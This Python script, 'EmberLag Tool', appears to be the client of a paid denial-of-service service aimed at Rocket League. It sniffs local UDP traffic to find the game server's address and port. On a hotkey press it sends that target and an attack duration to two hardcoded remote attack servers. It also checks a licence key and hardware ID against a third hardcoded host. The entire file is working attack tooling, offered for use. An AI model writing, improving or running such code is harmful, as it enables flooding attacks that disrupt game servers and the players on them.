import asyncio
import websockets
import os
import scapy.all as scapy
import keyboard
import re
import uuid
import aiohttp
from scapy.layers.inet import IP, UDP
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor

# === CONFIGURATION ===
WSS_URLS = [
    "ws://45.90.97.217:8080",
    "ws://45.155.54.118:8080"
]
SCAN_TIMEOUT = 5  # seconds
DEFAULT_ATTACK_DURATION = 5
API_URL = "http://37.27.141.177:9898"  # Hardcoded server URL

cooldown = False
target_ip = None
target_port = None
executor = ThreadPoolExecutor()

# ANSI color codes
RED = "\033[31m"
BRIGHT_RED = "\033[91m"
RESET = "\033[0m"

# HWID (MAC-based)
def get_hwid():
    return str(uuid.getnode())

# Validate key + HWID
async def validate_key_with_server(key, hwid):
    async with aiohttp.ClientSession() as session:
        try:
            async with session.post(f"{API_URL}/validate", json={"key": key, "hwid": hwid}) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    if data.get("success"):
                        print(f"{BRIGHT_RED}[+] Key validation success: {data.get('message')}{RESET}")
                        return True
                    else:
                        print(f"{RED}[-] Validation failed: {data.get('message')}{RESET}")
                        return False
                else:
                    print(f"{RED}[-] Validation HTTP error: {resp.status}{RESET}")
                    return False
        except Exception as e:
            print(f"{RED}[-] Validation request error: {e}{RESET}")
            return False

# RL traffic scan
def scan_rocket_league_traffic():
    packet_dict = defaultdict(int)
    def handler(pkt):
        if IP in pkt and UDP in pkt:
            ip_src, ip_dst = pkt[IP].src, pkt[IP].dst
            port_src, port_dst = pkt[UDP].sport, pkt[UDP].dport
            if 7000 <= port_src <= 8000 or 7000 <= port_dst <= 8000:
                key = f"{ip_src}:{port_src}->{ip_dst}:{port_dst}"
                packet_dict[key] += 1
    scapy.sniff(filter="udp", prn=handler, store=0, timeout=SCAN_TIMEOUT)
    best = sorted(packet_dict.items(), key=lambda x: x[1], reverse=True)
    for info, _ in best:
        match = re.match(r"([\d\.]+):(\d+)->([\d\.]+):(\d+)", info)
        if match:
            ip1, port1, ip2, port2 = match.groups()
            if ip1.startswith("192.168.") or ip1.startswith("10."):
                return ip2, int(port2)
            else:
                return ip1, int(port1)
    return None, None

# Attack function
async def send_payload(ip, port, duration):
    payload = f"{ip},{port},{duration}"

    async def send_to_url(url):
        try:
            async with websockets.connect(url) as ws:
                await ws.send(payload)
                print(f"[+] Sent to {url}: {payload}")
        except Exception as e:
            print(f"[-] Failed to send to {url}: {e}")

    await asyncio.gather(*(send_to_url(url) for url in WSS_URLS))

async def reset_cooldown():
    global cooldown
    await asyncio.sleep(4)
    cooldown = False

async def check_key(key):
    return await asyncio.get_event_loop().run_in_executor(executor, keyboard.is_pressed, key)

async def hotkey_loop():
    global target_ip, target_port, cooldown
    print()
    print(f"{BRIGHT_RED}== ORIENT HOTKEY MODE =={RESET}")
    print(f"{RED}[1]{RESET} to Scan for RL Server")
    print(f"{RED}[2]{RESET} to Launch Attack")
    print("Press [Esc] to Exit")

    while True:
        try:
            await asyncio.sleep(0.1)
            if await check_key('1'):
                ip, port = scan_rocket_league_traffic()
                if ip and port:
                    target_ip, target_port = ip, port
                    print(f"[+] Target locked: {target_ip}:{target_port}")
                else:
                    print("[-] No valid RL traffic found.")
                await asyncio.sleep(1)

            elif await check_key('2'):
                if cooldown:
                    print("[!] You can not send this many concurrents. Cooldown active.")
                elif target_ip and target_port:
                    cooldown = True
                    await send_payload(target_ip, target_port, DEFAULT_ATTACK_DURATION)
                    asyncio.create_task(reset_cooldown())
                else:
                    print("[-] No target set. Use key [1] to scan first.")
                await asyncio.sleep(1)

            elif await check_key('esc'):
                print("[+] Exiting controller...")
                break

        except Exception as main_error:
            print(f"[!] Controller Error: {main_error}")
            await asyncio.sleep(1)

async def main():
    print(f"{BRIGHT_RED}=== Welcome to EmberLag Tool ==={RESET}")
    key = input("Enter your license key: ").strip()
    hwid = get_hwid()
    print(f"Your HWID: {hwid}")

    print("Validating key with server...")
    valid = await validate_key_with_server(key, hwid)
    if not valid:
        print(f"{RED}Key validation failed. Exiting.{RESET}")
        return

    await hotkey_loop()

if __name__ == "__main__":
    asyncio.run(main())